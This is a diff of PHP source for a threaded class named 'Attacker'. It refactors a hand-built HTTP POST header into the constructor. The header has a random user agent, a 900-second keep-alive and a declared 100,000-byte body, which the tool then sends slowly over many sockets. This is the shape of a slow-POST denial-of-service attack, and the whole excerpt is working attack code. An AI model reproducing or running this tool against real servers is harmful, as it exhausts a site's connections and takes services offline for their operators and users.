@@ -30,13 +30,21 @@ class Attacker extends \Thread
   protected $port;
   protected $running;
   protected $chars;
+  protected $header;
   public function __construct(string $host,int $port,int $id)
   {
     $this->id = $id;
     $this->host = $host;
     $this->port = $port;
-    $this->running = true;
     $this->chars = basic_chars();
+    $this->header = "POST / HTTP/1.1\r\n".
+                   "Host: ".$this->host."\r\n".
+                   "User-Agent: ".self::$useragents[mt_rand(0,count(self::$useragents))]."\r\n".
+                   "Connection: keep-alive\r\n".
+                   "Keep-Alive: 900\r\n".
+                   "Content-Length: 100000\r\n".
+                   "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
+    $this->running = true;
   }
   public function shutdown()
   {
@@ -54,14 +62,7 @@ class Attacker extends \Thread
     try {
       $sock = new \yxmingy\ClientSocket();
       $sock->connect($this->host,$this->port);
-      $agent = self::$useragents[mt_rand(0,count(self::$useragents))];
-      $sock->write("POST / HTTP/1.1\r\n".
-                   "Host: ".$this->host."\r\n".
-                   "User-Agent: ".$agent."\r\n".
-                   "Connection: keep-alive\r\n".
-                   "Keep-Alive: 900\r\n".
-                   "Content-Length: 100000\r\n".
-                   "Content-Type: application/x-www-form-urlencoded\r\n\r\n");
+      $sock->write($this->header);
       //println("")
       $i = $s = 0;
       $c = count($this->chars);
